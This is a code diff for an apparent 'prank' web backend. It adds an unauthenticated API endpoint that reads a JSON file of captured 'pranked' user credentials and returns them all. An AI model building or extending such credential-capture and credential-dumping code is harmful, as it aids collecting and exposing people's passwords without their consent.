@@ -130,6 +130,27 @@ async def save_prank_credentials(credentials: PrankCredentials, request: Request
         logger.error(f"Error saving prank credentials: {str(e)}")
         raise HTTPException(status_code=500, detail=f"Failed to save credentials: {str(e)}")
 
+@api_router.get("/pranked-credentials")
+async def list_pranked_credentials():
+    """
+    Returns the saved credentials from pranked_user.json as a list.
+    If the file does not exist or is invalid/empty, returns an empty list.
+    """
+    credentials_file = ROOT_DIR / "pranked_user.json"
+    if not credentials_file.exists():
+        return []
+    try:
+        with open(credentials_file, 'r') as f:
+            content = f.read().strip()
+            if not content:
+                return []
+            data = json.loads(content)
+            if isinstance(data, list):
+                return data
+            return []
+    except (json.JSONDecodeError, ValueError):
+        return []
+
 # Include the router in the main app
 app.include_router(api_router)
 
